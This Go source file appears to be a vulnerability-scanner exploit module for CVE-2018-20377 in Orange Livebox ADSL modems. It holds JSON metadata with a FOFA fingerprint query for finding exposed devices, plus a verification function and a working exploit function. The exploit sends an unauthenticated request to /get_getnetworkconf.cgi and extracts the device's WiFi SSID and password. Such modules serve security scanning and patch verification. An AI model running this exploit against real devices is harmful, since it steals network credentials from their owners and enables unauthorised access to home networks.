package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Orange Livebox ADSL Modem get_getnetworkconf.cgi Information Disclosure Vulnerability (CVE-2018-20377)",
    "Description": "<p>The Orange Livebox is an ADSL (Asymmetric Digital Subscriber Line) modem. A security vulnerability exists in Orange Livebox version 00.96.320S.</p><p>A remote attacker could exploit this vulnerability by sending a GET request to the /get_getnetworkconf.cgi URI to obtain the device's SSID and WI-FI password.</p>",
    "Product": "Orange-Livebox",
    "Homepage": "https://www.orange.com/en/home",
    "DisclosureDate": "2021-06-10",
    "PostTime": "2023-08-04",
    "Author": "atdpa4sw0rd@gmail.com",
    "FofaQuery": "body=\"images/nextbutton.gif\" && body=\"images/preferencesbutton.gif\"",
    "GobyQuery": "body=\"images/nextbutton.gif\" && body=\"images/preferencesbutton.gif\"",
    "Level": "3",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.orange.com/en/home\">https://www.orange.com/en/home</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://badpackets.net/over-19000-orange-livebox-adsl-modems-are-leaking-their-wifi-credentials/"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2018-20377"
    ],
    "CNNVD": [
        "CNNVD-201812-1036"
    ],
    "CNVD": [
        "CNVD-2019-03480"
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "Orange Livebox ADSL 调制解调器 get_getnetworkconf.cgi 信息泄露漏洞 （CVE-2018-20377）",
            "Product": "Orange-Livebox",
            "Description": "<p>Orange Livebox 是一款 ADSL（非对称数字用户线路）调制解调器。 Orange Livebox 00.96.320S 版本中存在安全漏洞。</p><p>远程攻击者可通过向 /get_getnetworkconf.cgi URI 发送 GET 请求利用该漏洞获取设备的 SSID 和 WI-FI 密码。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.orange.com/en/home\">https://www.orange.com/en/home</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Orange Livebox ADSL Modem get_getnetworkconf.cgi Information Disclosure Vulnerability (CVE-2018-20377)",
            "Product": "Orange-Livebox",
            "Description": "<p>The Orange Livebox is an ADSL (Asymmetric Digital Subscriber Line) modem. A security vulnerability exists in Orange Livebox version 00.96.320S.</p><p>A remote attacker could exploit this vulnerability by sending a GET request to the /get_getnetworkconf.cgi URI to obtain the device's SSID and WI-FI password.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.orange.com/en/home\">https://www.orange.com/en/home</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10200"
}`
ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/get_getnetworkconf.cgi")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "WPA<BR")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfgGet := httpclient.NewGetRequestConfig("/get_getnetworkconf.cgi")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
				expResult.Success = true
				ssid := regexp.MustCompile(`(?s)<body>(.*?)<BR>`).FindStringSubmatch(resp.RawBody)[1]
				password := regexp.MustCompile(`(?s)<BR>(.*?)<BR>`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = fmt.Sprintf("SSID: %s\nPassword: %s", ssid, password)
			}
			return expResult
		},
	))
}